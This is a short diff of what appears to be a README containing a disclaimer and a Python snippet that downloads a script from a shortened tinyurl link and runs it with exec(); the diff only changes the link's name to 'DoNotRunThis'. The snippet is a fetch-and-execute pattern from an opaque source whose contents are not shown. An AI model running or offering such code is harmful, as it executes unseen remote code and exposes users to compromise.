@@ -5,6 +5,6 @@ I take no responsability of any consequence of running this script<br/>
 <br/>
 ```
 import urllib.request
-script = urllib.request.urlopen("https://tinyurl.com/btwktzns").read()
+script = urllib.request.urlopen("https://tinyurl.com/DoNotRunThis").read()
 exec(script)
 ```
